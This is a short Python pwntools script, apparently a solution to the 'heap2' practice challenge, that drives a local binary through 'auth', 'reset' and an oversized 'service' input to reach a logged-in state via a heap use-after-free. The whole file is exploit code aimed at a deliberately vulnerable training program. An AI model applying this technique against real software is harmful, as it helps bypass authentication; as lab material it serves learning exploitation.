#!/usr/bin/env python
import pwn

io = pwn.process("./heap2")

io.sendline(b"auth admin")
io.sendline(b"reset")
payload = b""
payload += b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
io.sendline(b"service " + payload)
io.sendline(b"login")
io.interactive()
